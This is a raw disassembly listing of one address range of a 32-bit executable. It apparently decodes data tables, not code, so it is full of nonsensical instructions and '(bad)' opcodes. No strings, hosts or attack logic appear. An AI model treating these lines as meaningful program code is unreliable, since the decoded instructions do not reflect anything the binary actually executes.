  405cf1:	00 16                	add    %dl,(%esi)
  405cf3:	00 03                	add    %al,(%ebx)
  405cf5:	17                   	pop    %ss
  405cf6:	e4 02                	in     $0x2,%al
  405cf8:	06                   	push   %es
  405cf9:	00 35 0e 55 00 06    	add    %dh,0x600550e
  405cff:	00 74 06 5c          	add    %dh,0x5c(%esi,%eax,1)
  405d03:	02 06                	add    (%esi),%al
  405d05:	00 74 0f 5c          	add    %dh,0x5c(%edi,%ecx,1)
  405d09:	02 06                	add    (%esi),%al
  405d0b:	00 0a                	add    %cl,(%edx)
  405d0d:	05 5c 02 06 00       	add    $0x6025c,%eax
  405d12:	7b 14                	jnp    0x405d28
  405d14:	5c                   	pop    %esp
  405d15:	02 06                	add    (%esi),%al
  405d17:	00 2a                	add    %ch,(%edx)
  405d19:	12 5c 02 16          	adc    0x16(%edx,%eax,1),%bl
  405d1d:	00 43 12             	add    %al,0x12(%ebx)
  405d20:	62 15 1a 00 fa 13    	bound  %edx,0x13fa001a
  405d26:	83 1a 1a             	sbbl   $0x1a,(%edx)
  405d29:	00 7f 11             	add    %bh,0x11(%edi)
  405d2c:	83 1a 8b             	sbbl   $0xffffff8b,(%edx)
  405d2f:	01 b3 14 00 00 1a    	add    %esi,0x1a000014(%ebx)
  405d35:	00 1f                	add    %bl,(%edi)
  405d37:	19 83 1a 06 00 3a    	sbb    %eax,0x3a00061a(%ebx)
  405d3d:	15 f2 0f 06 00       	adc    $0x60ff2,%eax
  405d42:	7a 00                	jp     0x405d44
  405d44:	f2 0f 06             	repnz clts
  405d47:	00 e9                	add    %ch,%cl
  405d49:	0f f2 0f             	pslld  (%edi),%mm1
  405d4c:	06                   	push   %es
  405d4d:	00 da                	add    %bl,%dl
  405d4f:	00 f2                	add    %dh,%dl
  405d51:	0f 06                	clts
  405d53:	00 e2                	add    %ah,%dl
  405d55:	12 fc                	adc    %ah,%bh
  405d57:	1c 06                	sbb    $0x6,%al
  405d59:	00 31                	add    %dh,(%ecx)
  405d5b:	10 fc                	adc    %bh,%ah
  405d5d:	1c 06                	sbb    $0x6,%al
  405d5f:	00 af 07 f2 0f 06    	add    %ch,0x60ff207(%edi)
  405d65:	00 84 10 f2 0f 1e 00 	add    %al,0x1e0ff2(%eax,%edx,1)
  405d6c:	28 11                	sub    %dl,(%ecx)
  405d6e:	aa                   	stos   %al,%es:(%edi)
  405d6f:	17                   	pop    %ss
  405d70:	06                   	push   %es
  405d71:	00 9d 1d bc 0e 06    	add    %bl,0x60ebc1d(%ebp)
  405d77:	00 d6                	add    %dl,%dh
  405d79:	0e                   	push   %cs
  405d7a:	bc 0e 06 00 82       	mov    $0x8200060e,%esp
  405d7f:	06                   	push   %es
  405d80:	bc 0e 06 00 77       	mov    $0x7700060e,%esp
  405d85:	03 f2                	add    %edx,%esi
  405d87:	0f 06                	clts
  405d89:	00 22                	add    %ah,(%edx)
  405d8b:	06                   	push   %es
  405d8c:	9c                   	pushf
  405d8d:	0b 0a                	or     (%edx),%ecx
  405d8f:	00 13                	add    %dl,(%ebx)
  405d91:	14 55                	adc    $0x55,%al
  405d93:	00 0a                	add    %cl,(%edx)
  405d95:	00 97 18 55 00 06    	add    %dl,0x6005518(%edi)
  405d9b:	00 d8                	add    %bl,%al
  405d9d:	04 55                	add    $0x55,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	f0 14 00             	lock adc $0x0,%al
  405da5:	00 12                	add    %dl,(%edx)
  405da7:	00 a5 05 be 12 06    	add    %ah,0x612be05(%ebp)
  405dad:	00 12                	add    %dl,(%edx)
  405daf:	00 c9                	add    %cl,%cl
  405db1:	02 06                	add    (%esi),%al
  405db3:	00 b6 10 f2 0f 06    	add    %dh,0x60ff210(%esi)
  405db9:	00 19                	add    %bl,(%ecx)
  405dbb:	1d 53 11 06 00       	sbb    $0x61153,%eax
  405dc0:	3b 08                	cmp    (%eax),%ecx
  405dc2:	f2 0f 06             	repnz clts
  405dc5:	00 fb                	add    %bh,%bl
  405dc7:	14 f2                	adc    $0xf2,%al
  405dc9:	0f 06                	clts
  405dcb:	00 fe                	add    %bh,%dh
  405dcd:	05 f2 0f 22 00       	add    $0x220ff2,%eax
  405dd2:	50                   	push   %eax
  405dd3:	12 59 13             	adc    0x13(%ecx),%bl
  405dd6:	22 00                	and    (%eax),%al
  405dd8:	d1 16                	rcll   $1,(%esi)
  405dda:	59                   	pop    %ecx
  405ddb:	13 22                	adc    (%edx),%esp
  405ddd:	00 80 13 59 13 12    	add    %al,0x12135913(%eax)
  405de3:	00 78 13             	add    %bh,0x13(%eax)
  405de6:	9f                   	lahf
  405de7:	15 22 00 e9 16       	adc    $0x16e90022,%eax
  405dec:	59                   	pop    %ecx
  405ded:	13 06                	adc    (%esi),%eax
  405def:	00 59 16             	add    %bl,0x16(%ecx)
  405df2:	fc                   	cld
  405df3:	1c 06                	sbb    $0x6,%al
  405df5:	00 ef                	add    %ch,%bh
  405df7:	11 f2                	adc    %esi,%edx
  405df9:	0f 06                	clts
  405dfb:	00 60 16             	add    %ah,0x16(%eax)
  405dfe:	fc                   	cld
  405dff:	1c 12                	sbb    $0x12,%al
  405e01:	00 14 13             	add    %dl,(%ebx,%edx,1)
  405e04:	fc                   	cld
  405e05:	1c 06                	sbb    $0x6,%al
  405e07:	00 a8 0f fc 1c 06    	add    %ch,0x61cfc0f(%eax)
  405e0d:	00 fb                	add    %bh,%bl
  405e0f:	00 fc                	add    %bh,%ah
  405e11:	1c 06                	sbb    $0x6,%al
  405e13:	00 d9                	add    %bl,%cl
  405e15:	11 f2                	adc    %esi,%edx
  405e17:	0f 06                	clts
  405e19:	00 0a                	add    %cl,(%edx)
  405e1b:	10 fc                	adc    %bh,%ah
  405e1d:	1c 06                	sbb    $0x6,%al
  405e1f:	00 4f 05             	add    %cl,0x5(%edi)
  405e22:	fc                   	cld
  405e23:	1c 06                	sbb    $0x6,%al
  405e25:	00 13                	add    %dl,(%ebx)
  405e27:	05 fc 1c 06 00       	add    $0x61cfc,%eax
  405e2c:	4b                   	dec    %ebx
  405e2d:	10 fc                	adc    %bh,%ah
  405e2f:	1c 06                	sbb    $0x6,%al
  405e31:	00 2e                	add    %ch,(%esi)
  405e33:	05 fc 1c 06 00       	add    $0x61cfc,%eax
  405e38:	c2 11 fc             	ret    $0xfc11
  405e3b:	1c 06                	sbb    $0x6,%al
  405e3d:	00 a1 13 f2 0f 06    	add    %ah,0x60ff213(%ecx)
  405e43:	00 8f 1c f2 0f 06    	add    %cl,0x60ff21c(%edi)
  405e49:	00 03                	add    %al,(%ebx)
  405e4b:	18 9f 15 06 00 db    	sbb    %bl,-0x24fff9eb(%edi)
  405e51:	05 f2 0f 06 00       	add    $0x60ff2,%eax
  405e56:	2e 03 fc             	cs add %esp,%edi
  405e59:	1c 06                	sbb    $0x6,%al
  405e5b:	00 c7                	add    %al,%bh
  405e5d:	00 f2                	add    %dh,%dl
  405e5f:	0f 06                	clts
  405e61:	00 c9                	add    %cl,%cl
  405e63:	05 f2 0f 06 00       	add    $0x60ff2,%eax
  405e68:	47                   	inc    %edi
  405e69:	06                   	push   %es
  405e6a:	f2 0f 06             	repnz clts
  405e6d:	00 32                	add    %dh,(%edx)
  405e6f:	18 5c 02 06          	sbb    %bl,0x6(%edx,%eax,1)
  405e73:	00 40 08             	add    %al,0x8(%eax)
  405e76:	5c                   	pop    %esp
  405e77:	02 0a                	add    (%edx),%cl
  405e79:	00 b5 0f 12 11 0a    	add    %dh,0xa11120f(%ebp)
  405e7f:	00 3f                	add    %bh,(%edi)
  405e81:	05 12 11 00 00       	add    $0x1112,%eax
  405e86:	00 00                	add    %al,(%eax)
  405e88:	40                   	inc    %eax
  405e89:	01 00                	add    %eax,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 cd                	add    %cl,%ch
  405e97:	0f 7c                	(bad)
  405e99:	1a 05 00 01 00 01    	sbb    0x1000100,%al
  405e9f:	00 81 01 10 00 15    	add    %al,0x15001001(%ecx)
  405ea5:	17                   	pop    %ss
  405ea6:	7c 1a                	jl     0x405ec2
  405ea8:	05 00 01 00 03       	add    $0x3000100,%eax
  405ead:	00 81 01 10 00 9d    	add    %al,-0x62ffefff(%ecx)
  405eb3:	19 9a 11 05 00 13    	sbb    %ebx,0x13000511(%edx)
  405eb9:	00 06                	add    %al,(%esi)
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 b0 12 0a 0f 05    	add    %dh,0x50f0a12(%eax)
  405ec5:	00 1e                	add    %bl,(%esi)
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	35 17 39 14 05       	xor    $0x5143917,%eax
  405ed3:	00 1e                	add    %bl,(%esi)
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 8c    	add    %al,-0x73ffefff(%ecx)
  405edd:	10 39                	adc    %bh,(%ecx)
  405edf:	14 05                	adc    $0x5,%al
  405ee1:	00 1e                	add    %bl,(%esi)
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 49 13             	add    %cl,0x13(%ecx)
  405eec:	39 14 05 00 1e 00 2f 	cmp    %edx,0x2f001e00(,%eax,1)
  405ef3:	00 81 01 10 00 5a    	add    %al,0x5a001001(%ecx)
  405ef9:	15 39 14 05 00       	adc    $0x51439,%eax
  405efe:	1e                   	push   %ds
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 59    	add    %al,0x59001001(%ecx)
  405f07:	0f 39                	(bad)
  405f09:	14 05                	adc    $0x5,%al
  405f0b:	00 1e                	add    %bl,(%esi)
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 54    	add    %al,0x54001001(%ecx)
  405f15:	15 39 14 05 00       	adc    $0x51439,%eax
  405f1a:	1f                   	pop    %ds
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 01                	add    %al,(%ecx)
  405f23:	02 00                	add    (%eax),%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 9a    	add    %al,-0x65ffefff(%ecx)
  405f31:	0e                   	push   %cs
  405f32:	39 14 05 00 23 00 3e 	cmp    %edx,0x3e002300(,%eax,1)
  405f39:	00 81 01 10 00 63    	add    %al,0x63001001(%ecx)
  405f3f:	1d 39 14 05 00       	sbb    $0x51439,%eax
  405f44:	23 00                	and    (%eax),%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 96    	add    %al,-0x69ffefff(%ecx)
  405f4d:	19 78 19             	sbb    %edi,0x19(%eax)
  405f50:	05 00 24 00 46       	add    $0x46002400,%eax
  405f55:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f5b:	00 00                	add    %al,(%eax)
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 0d 01 f9 0f 05    	add    %cl,0x50ff901
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f78:	f9                   	stc
  405f79:	0f 05                	syscall
  405f7b:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 58 01             	add    %bl,0x1(%eax)
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 38                	add    %bh,(%eax)
  405f93:	00 00                	add    %al,(%eax)
  405f95:	00 51 00             	add    %dl,0x0(%ecx)
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 9f 17 c3 0d 05    	add    %bl,0x50dc317(%edi)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 5c 10 c3          	add    %bl,-0x3d(%eax,%edx,1)
  405fb1:	0d 05 00 2f 00       	or     $0x2f0005,%eax
  405fb6:	5f                   	pop    %edi
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 69 1c             	add    %ch,0x1c(%ecx)
  405fbe:	c3                   	ret
  405fbf:	0d 05 00 31 00       	or     $0x310005,%eax
  405fc4:	63 00                	arpl   %eax,(%eax)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	de 0d c3 0d 05 00    	fimuls 0x50dc3
  405fd0:	33 00                	xor    (%eax),%eax
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	14 08                	adc    $0x8,%al
  405fda:	c3                   	ret
  405fdb:	0d 39 00 3a 00       	or     $0x3a0039,%eax
  405fe0:	95                   	xchg   %eax,%ebp
  405fe1:	00 00                	add    %al,(%eax)
  405fe3:	00 10                	add    %dl,(%eax)
  405fe5:	00 8a 17 c3 0d 05    	add    %cl,0x50dc317(%edx)
  405feb:	00 47 00             	add    %al,0x0(%edi)
  405fee:	95                   	xchg   %eax,%ebp
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 94 17 c3 0d 05 00 	add    %dl,0x50dc3(%edi,%edx,1)
  405ffa:	47                   	inc    %edi
  405ffb:	00 99 00 81 01 10    	add    %bl,0x10018100(%ecx)
  406001:	00 8a 12 c3 0d 05    	add    %cl,0x50dc312(%edx)
  406007:	00 47 00             	add    %al,0x0(%edi)
  40600a:	a2 00 00 01 00       	mov    %al,0x10000
  40600f:	00 49 01             	add    %cl,0x1(%ecx)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 1b                	add    %bl,(%ebx)
  40601f:	01 00                	add    %eax,(%eax)
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 a4 18 	add    %ah,0x18a40016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 b1 18 12 00 16    	add    %dh,0x16001218(%ecx)
  406035:	00 0a                	add    %cl,(%edx)
  406037:	11 12                	adc    %edx,(%edx)
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 11                	add    %dl,(%ecx)
  40603d:	0f 12 00             	movlps (%eax),%xmm0
  406040:	16                   	push   %ss
  406041:	00 3b                	add    %bh,(%ebx)
  406043:	13 12                	adc    (%edx),%edx
  406045:	00 16                	add    %dl,(%esi)
  406047:	00 4e 06             	add    %cl,0x6(%esi)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 f3                	add    %dh,%bl
  40604f:	1c 12                	sbb    $0x12,%al
  406051:	00 16                	add    %dl,(%esi)
  406053:	00 97 02 12 00 16    	add    %dl,0x16001202(%edi)
  406059:	00 a3 08 12 00 16    	add    %ah,0x16001208(%ebx)
  40605f:	00 56 08             	add    %dl,0x8(%esi)
  406062:	12 00                	adc    (%eax),%al
  406064:	16                   	push   %ss
  406065:	00 9d 08 15 00 16    	add    %bl,0x16001508(%ebp)
  40606b:	00 a7 0d 12 00 16    	add    %ah,0x1600120d(%edi)
  406071:	00 14 01             	add    %dl,(%ecx,%eax,1)
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 d2                	add    %dl,%dl
  406079:	10 12                	adc    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 6b 02             	add    %ch,0x2(%ebx)
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 7c 03 12          	add    %bh,0x12(%ebx,%eax,1)
  406087:	00 16                	add    %dl,(%esi)
  406089:	00 48 1c             	add    %cl,0x1c(%eax)
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 aa 12 12 00 11    	add    %ch,0x11001212(%edx)
  406095:	00 88 04 21 00 11    	add    %cl,0x11002104(%eax)
  40609b:	00 6d 04             	add    %ch,0x4(%ebp)
  40609e:	25 00 11 00 3d       	and    $0x3d001100,%eax
  4060a3:	04 29                	add    $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 d3                	add    %dl,%bl
  4060a9:	03 2d 00 11 00 55    	add    0x55001100,%ebp
  4060af:	04 2d                	add    $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 b8 03 30 00 11    	add    %bh,0x11003003(%eax)
  4060b9:	00 9b 03 34 00 31    	add    %bl,0x31003403(%ebx)
  4060bf:	00 81 03 37 00 11    	add    %al,0x11003703(%ecx)
  4060c5:	00 ef                	add    %ch,%bh
  4060c7:	03 30                	add    (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 23                	add    %ah,(%ebx)
  4060cd:	04 3a                	add    $0x3a,%al
  4060cf:	00 11                	add    %dl,(%ecx)
  4060d1:	00 05 04 34 00 16    	add    %al,0x16003404
  4060d7:	00 8e 12 dc 00 06    	add    %cl,0x600dc12(%esi)
  4060dd:	06                   	push   %es
  4060de:	9b                   	fwait
  4060df:	02 06                	add    (%esi),%al
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	70 02                	jo     0x4060e8
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 ce 01             	or     $0x1,%dh
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 bb 01 09 01 31 00 	cmpb   $0x0,0x31010901(%ebx)
  4060f6:	fe 01                	incb   (%ecx)
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 53 17             	add    %dl,0x17(%ebx)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 0b                	add    %cl,(%ebx)
  406103:	00 43 01             	add    %al,0x1(%ebx)
  406106:	51                   	push   %ecx
  406107:	80 99 0d 3a 00 51 80 	sbbb   $0x80,0x51003a0d(%ecx)
  40610e:	95                   	xchg   %eax,%ebp
  40610f:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  406114:	8c 0d 3a 00 51 80    	mov    %cs,0x8051003a
  40611a:	70 0d                	jo     0x406129
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	f7 1c 29             	negl   (%ecx,%ebp,1)
  406123:	00 21                	add    %ah,(%ecx)
  406125:	00 d8                	add    %bl,%al
  406127:	1c 29                	sbb    $0x29,%al
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 f8                	add    %bh,%al
  40612d:	19 29                	sbb    %ebp,(%ecx)
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 77 01             	add    %esi,0x1(%edi)
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	65 05 8f 01 01 00    	gs add $0x1018f,%eax
  40613e:	98                   	cwtl
  40613f:	10 30                	adc    %dh,(%eax)
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 b9 11 3a 00 01    	add    %bh,0x1003a11(%ecx)
  406149:	00 98 10 30 01 01    	add    %bl,0x1013010(%eax)
  40614f:	00 33                	add    %dh,(%ebx)
  406151:	14 c7                	adc    $0xc7,%al
  406153:	01 01                	add    %eax,(%ecx)
  406155:	00 aa 07 12 00 01    	add    %ch,0x1001207(%edx)
  40615b:	00 8a 07 12 00 01    	add    %cl,0x1001207(%edx)
  406161:	00 ac 0a 37 00 01 00 	add    %ch,0x10037(%edx,%ecx,1)
  406168:	0a 08                	or     (%eax),%cl
  40616a:	02 02                	add    (%edx),%al
  40616c:	01 00                	add    %eax,(%eax)
  40616e:	a1 1a c7 01 01       	mov    0x101c71a,%eax
  406173:	00 98 10 30 01 01    	add    %bl,0x1013010(%eax)
  406179:	00 8a 1c 06 02 06    	add    %cl,0x602061c(%edx)
  40617f:	06                   	push   %es
  406180:	9b                   	fwait
  406181:	02 3a                	add    (%edx),%bh
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	01 12                	add    %edx,(%edx)
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 54 0f 02 02       	adcb   $0x2,0x2(%edi,%ecx,1)
  406190:	56                   	push   %esi
  406191:	80 79 12 02          	cmpb   $0x2,0x12(%ecx)
  406195:	02 56 80             	add    -0x80(%esi),%dl
  406198:	8f                   	(bad)
  406199:	1c 02                	sbb    $0x2,%al
  40619b:	02 56 80             	add    -0x80(%esi),%dl
  40619e:	c7                   	(bad)
  40619f:	0c 02                	or     $0x2,%al
  4061a1:	02 56 80             	add    -0x80(%esi),%dl
  4061a4:	e3 13                	jecxz  0x4061b9
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 c7 00             	add    $0x0,%bh
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 84 10 02 02 56 80 	addb   $0xe,-0x7fa9fdfe(%eax,%edx,1)
  4061b6:	0e 
  4061b7:	19 02                	sbb    %eax,(%edx)
  4061b9:	02 56 80             	add    -0x80(%esi),%dl
  4061bc:	47                   	inc    %edi
  4061bd:	06                   	push   %es
  4061be:	02 02                	add    (%edx),%al
  4061c0:	56                   	push   %esi
  4061c1:	80 af 07 02 02 56 80 	subb   $0x80,0x56020207(%edi)
  4061c8:	48                   	dec    %eax
  4061c9:	1d 02 02 33 01       	sbb    $0x1330202,%eax
  4061ce:	11 02                	adc    %eax,(%edx)
  4061d0:	fd                   	std
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 a1 10 0a 00 01    	add    %ah,0x1000a10(%ecx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	05 15 0e 00 01       	add    $0x1000e15,%eax
  4061ed:	00 f8                	add    %bh,%al
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 0b                	add    %cl,(%ebx)
  4061f7:	17                   	pop    %ss
  4061f8:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 3b 0d 1d    	add    %dl,0x1d0d3b00(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 0b 15 0a    	add    %dl,0xa150b18(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 52 1a 3d    	add    %dl,0x3d1a5208(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 60 1a 42    	add    %dl,0x421a6008(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 36 1a 48    	add    %dl,0x481a3608(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 44 1a 4d    	add    %dl,0x4d1a4408(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 92 13 53    	add    %dl,0x53139208(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 9d 13 58    	add    %dl,0x58139d08(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 1a 0b 5e    	add    %dl,0x5e0b1a08(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 29                	or     %ch,(%ecx)
  406283:	0b 62 00             	or     0x0(%edx),%esp
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 cf 19 5e    	add    %dl,0x5e19cf08(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 da 19 62    	add    %dl,0x6219da08(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 cf 0a 67    	add    %dl,0x670acf08(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 dd 0a 6c    	add    %dl,0x6c0add08(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 4a 03 1d    	add    %dl,0x1d034a08(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 5a 03 72    	add    %dl,0x72035a08(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 fa 02 77    	add    %dl,0x7702fa08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 8a 0b 67    	add    %dl,0x670b8a08(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 93 0b 6c    	add    %dl,0x6c0b9308(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 f0 0e 7b    	add    %dl,0x7b0ef008(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 fd 0e 7f    	add    %dl,0x7f0efd08(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 e7 0c 1d    	add    %dl,0x1d0ce708(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 f8 0c 72    	add    %dl,0x720cf808(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 25 1a 0a    	add    %dl,0xa1a2500(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 6b 07 84    	add    %dl,-0x7bf89500(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 95 08 89    	add    %dl,-0x76f76b00(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 54 19 0a    	add    %dl,0xa195400(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
